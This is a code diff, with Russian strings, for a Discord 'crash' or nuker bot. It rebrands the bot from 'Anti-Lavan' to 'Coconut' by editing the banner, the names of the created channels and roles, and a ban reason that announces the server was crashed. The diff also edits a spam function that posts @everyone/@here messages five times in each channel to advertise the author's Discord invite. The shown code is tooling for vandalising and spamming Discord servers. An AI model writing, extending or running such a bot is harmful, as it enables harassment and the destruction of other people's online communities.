@@ -5,6 +5,8 @@ cl = """
   dPYb   8d8b. w8ww w      8    .d88 Yb  dP .d88 8d8b. 
  dPwwYb  8P Y8  8   8 wwww 8    8  8  YbdP  8  8 8P Y8 
 dP    Yb 8   8  Y8P 8      8888 `Y88   YP   `Y88 8   8
+
+Стабильно
                                                           
                                                           """
 print(cl)
@@ -40,9 +42,9 @@ if 'да' in str(echo.lower()):
 else:
     pass
 
-channelname = 'Crash By Anti-Lavan'
-rolename = 'Crashed By Anti-Lavan'
-reasonb = 'Сервер крашнут ботом Anti-Lavan'
+channelname = 'Crash By Coconut'
+rolename = 'Crashed By Coconut'
+reasonb = 'Сервер крашнут ботом Кокоса'
 
 intents = discord.Intents.default()
 intents.members = True
@@ -135,7 +137,7 @@ async def icon(ctx):
 async def sendspam(channel):
         try:
             for _ in range(5):
-                await channel.send('@everyone / @here\nДанный сервер крашиться ботом Anti-Lavan (разработчик в telegram - `@forzel_discord`)\nTelegram channel: https://t.me/protectcheck')
+                await channel.send('@everyone / @here\nДанный сервер крашиться ботом Coconut. Мой сервер - https://discord.gg/N6bvbvPAYr')
         except:
             print(f'{Fore.RED}[ ERROR ] Не отправил спам на сервер {channel.guild.name} в канал #{channel.name}')
 
